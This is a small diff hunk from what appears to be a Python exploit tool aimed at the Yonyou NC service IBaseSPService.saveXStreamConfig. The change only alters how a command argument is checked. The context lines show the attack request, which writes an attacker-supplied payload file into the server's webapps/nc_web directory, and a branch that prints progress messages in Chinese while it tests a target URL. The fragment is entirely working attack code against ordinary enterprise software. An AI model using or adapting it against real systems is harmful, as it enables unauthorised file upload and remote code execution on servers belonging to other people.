@@ -115,7 +115,7 @@ def main():
     uploaddata = '{{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["{}","webapps/nc_web/{}"]}}'.format(payload,args.filename)
     
     #单个url检测，不执行命令
-    if(args.targeturl and len(args.command) == 0):
+    if(args.targeturl and args.command == None):
         print("[+]---INFO:开始对" + args.targeturl + "进行测试---")
         flag = upload(args.targeturl,random_headers(),uploaddata,args.filename)
         if flag:
